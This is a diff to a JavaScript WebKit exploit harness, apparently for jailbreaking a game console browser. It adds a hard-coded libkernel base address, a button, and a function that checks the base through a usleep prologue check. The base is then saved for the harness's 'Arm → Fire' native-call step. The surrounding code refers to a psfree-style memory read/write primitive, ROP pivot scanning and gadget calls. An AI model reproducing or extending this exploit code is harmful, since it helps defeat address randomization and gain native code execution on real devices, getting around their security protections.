@@ -45,6 +45,7 @@ import {
     resolveLibkernelFindChunk,
     resolveLibkernelRelroChunk,
     verifyLibkernelBase,
+    verifyLibkernelUsleep1352,
     extPtrToLkCandidates,
     plausibleHeapCell,
     resolveExtModuleHunt,
@@ -55,7 +56,9 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832e";
+const BUILD_ID = "rw-20250832f";
+/** BillZaiD fixed lk base (game process) — trial in WebKit via usleep prologue */
+const BILLZAI_LK_BASE = "80a67c000";
 const SS_HUNT_TRACE = "wk-hunt-trace";
 const SS_HUNT_STATE = "wk-hunt-state";
 /** opt-in only — release triggers JSC GC */
@@ -121,7 +124,7 @@ let raceMode = false;
 const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
-let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk;
+let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk, btnTryBillZaiLk;
 let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot;
 let gadgetBtns = [];
@@ -230,6 +233,7 @@ function setUi() {
     }
     if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
     if (btnForceLk) btnForceLk.disabled = busy || !ready;
+    if (btnTryBillZaiLk) btnTryBillZaiLk.disabled = busy || !ready;
     if (btnGuessLk) {
         btnGuessLk.disabled = !ready || (busy && !huntLkAuto);
         btnGuessLk.textContent = huntLkAuto ? "Hunting lk…" : "Hunt lk";
@@ -547,6 +551,7 @@ const MANUAL_TESTS = [
     { id: "try-cal-ptrs", group: "base", label: "Load cal ptr" },
     { id: "verify-lk", group: "base", label: "Verify lk" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
+    { id: "try-billzai-lk", group: "base", label: "Try BillZai lk" },
     { id: "force-lk", group: "base", label: "Force lk" },
     { id: "paste-lk", group: "base", label: "Paste lk (1 peek)" },
     { id: "libkernel", group: "base", label: "libkernel" },
@@ -570,7 +575,8 @@ const MANUAL_TESTS = [
 
 function runManualTest(testId) {
     if (!ready || !window.p) return;
-    if (busy && testId !== "verify-lk" && testId !== "force-lk" && testId !== "paste-lk") {
+    if (busy && testId !== "verify-lk" && testId !== "force-lk" && testId !== "paste-lk"
+        && testId !== "try-billzai-lk") {
         mark("SKIP", "busy — Stop find or wait");
         renderOut();
         return;
@@ -650,6 +656,10 @@ function runManualTest(testId) {
             renderOut();
             crashLog.append("LK-OK pasted " + lk, "LK-OK");
             crashLog.flushSync();
+            return;
+        }
+        if (testId === "try-billzai-lk") {
+            runTryBillZaiLk();
             return;
         }
         if (testId === "force-lk") {
@@ -3080,6 +3090,48 @@ function getpidStubAddr(lk, off) {
     return { stub: lk.add32(stubOff), stubOff };
 }
 
+function runTryBillZaiLk() {
+    if (!ready || !window.p) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const lk = parseAddr(BILLZAI_LK_BASE);
+    if (!lk) {
+        mark("LK-BILLZAI-ERR", "bad base constant");
+        renderOut();
+        return;
+    }
+    if (addrIn) addrIn.value = "0x" + BILLZAI_LK_BASE;
+    mark("LK-BILLZAI", "base=0x" + BILLZAI_LK_BASE + " verify usleep+13b20 build=" + BUILD_ID);
+    renderOut();
+    crashLog.flushSync();
+
+    try {
+        const v = verifyLibkernelUsleep1352(p, lk, off);
+        if (v.ok && v.strong) {
+            saveLibkernelSession(lk, null, { forced: true });
+            mark("LK-BILLZAI-OK", String(lk) + " usleep+" + v.usleepOff.toString(16)
+                + " __error+" + v.errOff.toString(16)
+                + " raw=usleep:0x" + (v.wUsleep >>> 0).toString(16));
+            state("BillZai base verified — Arm → Fire", "ok");
+        } else if (v.ok) {
+            saveLibkernelSession(lk, null, { forced: true });
+            mark("LK-BILLZAI-WARN", String(lk) + " usleep OK — " + (v.warn || "weak"));
+            state("usleep OK — try Arm → Fire", "warn");
+        } else {
+            mark("LK-BILLZAI-MISS", v.error || "verify fail"
+                + (v.wUsleep != null ? " raw=0x" + (v.wUsleep >>> 0).toString(16) : ""));
+            state("BillZai base not valid in WebKit", "bad");
+        }
+        crashLog.append("LK-BILLZAI " + (v.ok ? "OK" : "MISS") + " 0x" + BILLZAI_LK_BASE, "LK-BILLZAI");
+        crashLog.flushSync();
+    } catch (err) {
+        mark("LK-BILLZAI-ERR", err.message || String(err));
+        state("BillZai try error", "bad");
+        crashLog.flushSync();
+    }
+    renderOut();
+}
+
 /** Force lk — 0 reads, session only. Arm + Fire are separate taps. */
 function runForceLkOnly(lk) {
     if (busy || !ready) return;
@@ -3458,6 +3510,7 @@ function init() {
     btnNative = $("btn-native");
     btnLoadCal = $("btn-load-cal");
     btnForceLk = $("btn-force-lk");
+    btnTryBillZaiLk = $("btn-try-billzai-lk");
     btnGuessLk = $("btn-guess-lk");
     btnPsfreeLite = $("btn-psfree-lite");
     btnPsfreeLk = $("btn-psfree-lk");
@@ -3483,6 +3536,7 @@ function init() {
     wireClick(btnNative, function () { return runNativeCall(); });
     wireClick(btnLoadCal, function () { runTryCalPtrs(); });
     wireClick(btnForceLk, function () { runManualTest("force-lk"); });
+    wireClick(btnTryBillZaiLk, function () { runManualTest("try-billzai-lk"); });
     wireClick(btnGuessLk, function () { runGuessLk(); });
     wireClick(btnPsfreeLite, function () { return runFindLkAuto(FIND_LK_LITE); });
     wireClick(btnPsfreeLk, function () { return runFindLkAuto(FIND_LK_NORM); });
